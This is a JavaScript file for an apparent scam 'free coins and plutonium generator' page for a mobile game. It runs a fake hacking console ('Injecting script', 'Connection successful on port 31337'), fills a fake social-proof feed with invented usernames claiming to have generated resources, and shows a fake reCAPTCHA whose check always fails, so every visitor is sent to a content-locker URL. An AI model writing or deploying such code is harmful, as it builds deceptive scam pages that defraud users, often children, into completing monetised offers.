Array.prototype.rnd = function() {
    return this[Math.floor((Math.random() * this.length))];
}

var contentLockerUrl = 'https://www.locked1.com/cl.php?id=fe3bef46c74cb5932be0b73c8f14e847';
var recentActivity = {
    "nicknames": ["jdimo", "Sirwilliam99", "Uncaged", "DavidGilbert", "jozo24", "Zegaloft", "Momkiller", "ShahedHasan", "ForgiveMeNot", "Noctaire", "Shadrach777", "davelaar", "Kman167", "andrgin", "JoshuaTrueHeart", "Duad1945", "IjTommy4", "BombTower", "Daisycloud", "PurpleDeathStar", "DanTheMan2016", "Expand", "RisedPhoenix", "Xenolith", "ultimatex31", "Redheadedluck441", "x9999x", "SpazAu", "BbaBaba123", "aTH", "jstammi", "KonstBR", "GamerJohn201", "Jeanette0711", "Hansdev", "Jose23", "AFrostyBlaze", "Echo008", "nstar612", "Vman2612", "Tiwaz", "WarlockFamily", "Kylechetti", "ElderStriker", "LootWarrior", "Anoushka", "GDufresneC", "LanceClash22", "Dragonbldz", "Radaniel", "Bjk1989", "lalalili", "serenitycotc2", "Knowledgeable", "Killercheese", "Kidsrocxy", "JonnyVW", "Kenchafer", "MJPB", "Mithaminator", "WormShoes", "Marko996", "renaatski", "MxBunnyZ", "DoreneBeaudry19", "RoyaleBourassa", "Snagit77", "PhilISuppose", "TheKingofCOC2014", "jqgunty", "x222x", "Gamer0102", "Dyleon", "VernonSalmonsd32", "Kozmo91", "ChongCheeLeong", "freakazoid1985", "hammad0123", "ArchRedRagers", "JubilantJess"],
    "resources": [
        ["10,000 Coins & Plutonium", "20,000 Coins & Plutonium", "30,000 Plutonium & Coins", "50,000 Plutonium & Coins", "90,000 Plutonium & Coins"]
    ]
};
var listUserAccept = [];
var generatorData = {
    username: '',
};
var generatorConsoleData = new Array({
    id: 0,
    text: 'Connecting to server. Sent control packet type is 7 (Outgoing-Call-Request)'
}, {
    id: 1,
    text: 'Validating user \'<strong>{username}</strong>\''
}, {
    id: 2,
    text: 'Generating SHA-256 verification strings: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 3,
    text: 'Validating blocks [1-512]: <span class="console-progress" data-goal="512">0</span>'
}, {
    id: 4,
    text: 'Connecting to game server. Outgoing call established (call ID 0, peer\'s call ID 19319)'
}, {
    id: 5,
    text: 'Establishing connection: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 6,
    text: 'Connection successful on port 31337'
}, {
    id: 7,
    text: 'Downloading data: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 8,
    text: 'Extracting data: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 9,
    text: 'Calculating CRC values'
}, {
    id: 10,
    text: 'Packing data: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 11,
    text: 'Injecting script. Sending <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 12,
    text: 'Checking server response...'
}, {
    id: 13,
    text: 'Generating Followers: <span class="console-progress" data-goal="100">0</span>%'
}, {
    id: 14,
    text: 'Generating Followers: Done'
}, {
    id: 15,
    text: 'Finalizing Process: <span class="console-progress" data-goal="88">0</span>%'
});

function generatorConsoleInit() {
    $('#button-generate').click(function() {
        $('#form-error-list').addClass('hidden');
        generatorData.username = $('#generator-form-username').val();
        if (!generatorData.username || generatorData.username.trim() == '') {
            $('#form-error-list').removeClass('hidden');
            return;
        }
        $('#generator-form-username').prop('readonly', true);
        $('#button-generate-container').addClass('hidden');
        $('#generator-console').removeClass('hidden');
        $('html, body').animate({
            scrollTop: $("#generator-console").offset().top - 20
        }, 400);
        generatorConsoleStep(-1);
    });
}

function generatorConsoleStep(id) {
    var spanProgress = $('#generator-console > div:last > .console-progress');
    if (spanProgress.length == 0 || $(spanProgress).data('goal') == $(spanProgress).text()) {
        id = id + 1;
        if (id >= generatorConsoleData.length) {
            setTimeout(generatorDialogShow, 1500);
            return false;
        }
        var html = '<div class="generator-console-row">' + generatorConsoleData[id].text + '</div>';
        if (html.indexOf('') >= 0) {
            html = html.replace('{username}', generatorData.username);
        }
        var e = $('#generator-console')[0];
        $(e).append(html).animate({
            scrollTop: e.scrollHeight
        }, 100);
        setTimeout(generatorConsoleStep, html.indexOf('console-progress') >= 0 ? 0 : 500 + Math.floor(Math.random() * 1500), id);
    } else {
        var curr = parseInt($(spanProgress).text()) + Date.now() % 20;
        var goal = $(spanProgress).data('goal');
        $(spanProgress).text(curr <= goal ? curr : goal);
        setTimeout(generatorConsoleStep, 25 + Date.now() % 100, id);
    }
}

function generatorDialogShow() {
    $('#verify-dialog').removeClass('hidden');
}

var recentActivityUsernameId = Date.now() % recentActivity.nicknames.length;

function recentActivityLoop() {
    var activityCountry = Math.random() > .5 ? Array('at', 'au', 'be', 'br', 'ca', 'de', 'dk', 'es', 'ir', 'it', 'fr', 'nl', 'pt', 'se', 'uk').rnd() : 'us';
    recentActivityUsernameId++;
    if (recentActivityUsernameId >= recentActivity.nicknames.length) {
        recentActivityUsernameId = 0;
    }
    var nickname = recentActivity.nicknames[recentActivityUsernameId];
    var node = document.getElementById('container-activity');
    if (node.children.length > 4) {
        $(node.children[0]).remove();
    }
    var resourceText = '';
    if (recentActivity.resources.length == 0) {
        return;
    }
    if (recentActivity.resources.length == 1) {
        resourceText = '<strong>' + recentActivity.resources[0].rnd() + '</strong>';
    }
    if (recentActivity.resources.length == 2) {
        resourceText = '<strong>' + recentActivity.resources[0].rnd() + '</strong> and <strong>' + recentActivity.resources[1].rnd() + '</strong>';
    }
    if (recentActivity.resources.length > 2) {
        resourceText = '<strong>' + recentActivity.resources[recentActivity.resources.length - 2].rnd() + '</strong> and <strong>' + recentActivity.resources[recentActivity.resources.length - 1].rnd() + '</strong>';
        for (var i = recentActivity.resources.length - 3; i >= 0; i--) {
            resourceText = '<strong>' + recentActivity.resources[i].rnd() + '</strong>, ' + resourceText;
        }
    }
    $('#container-activity').append('<div class="recent-activity-row" style="background-image: url(\'/images/common/flags/' + activityCountry + '.png\');">' + '<strong>' + nickname + '</strong> has generated ' + resourceText + ' · <span class="recent-activity-timer" data-created="' + Date.now() + '">1s</span> ago</div>');
    var delay = 1000 * Math.floor(Math.random() * 20);
    setTimeout(recentActivityLoop, delay);
}

function recentActivityTimerLoop() {
    $('.recent-activity-timer').each(function() {
        var secTotal = Math.floor((Date.now() - $(this).attr("data-created")) / 1000);
        var min = Math.floor(secTotal / 60);
        $(this).html((min > 0 ? min + 'm ' : '') + secTotal % 60 + 's');
    });
    setTimeout(recentActivityTimerLoop, 999);
}

var recaptchaClickEvent = false;

function recaptchaClick() {
    if (recaptchaClickEvent) {
        return;
    }
    recaptchaClickEvent = true;
    document.getElementById('recaptcha-checkbox').style.display = 'none';
    document.getElementById('recaptcha-spinfast').style.display = 'block';
    setTimeout(function() {
        document.getElementById('recaptcha-spinlong').style.display = 'block';
        console.log(generatorData.username);

        if (listUserAccept.indexOf(generatorData.username) >= 0) {
            setTimeout(function() {
                document.getElementById('recaptcha-spinlong').style.display = 'none';
                document.getElementById('recaptcha-checkmark').style.display = 'block';

                var html = $('#recaptcha-resolved-text').html();
                html = html.replace('{username}', generatorData.username);
                $('#recaptcha-resolved-text').html(html);

                setTimeout(function() {
                    $('#recaptcha-container').addClass('hidden');
                    $('#username-verified').css({
                        'display': 'table'
                    });
                }, 1000);
            }, 2500);
        } else {
            setTimeout(function() {
                document.getElementById('recaptcha-spinlong').style.display = 'block';
                setTimeout(function() {
                    window.location = contentLockerUrl;
                }, 1500);
            }, 400);
        }
    }, 400);
}

$(document).ready(function() {
    recentActivityLoop();
    recentActivityTimerLoop();
    generatorConsoleInit();

    $('#generator-form-platform').change(function() {
        var html = '';
        switch ($('#generator-form-platform option:selected').val()) {
            case 'android':
                html = '<img src="images/generator-form-platrom-android.png" />';
                break;
            case 'ios':
                html = '<img src="images/generator-form-platrom-ios.png" />';
                break;
        }
        $('#generator-form-platform-label').html(html);
    });

    if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {
        $("#generator-form-platform").val('ios');
        $('#generator-form-platform').change();
    }
});
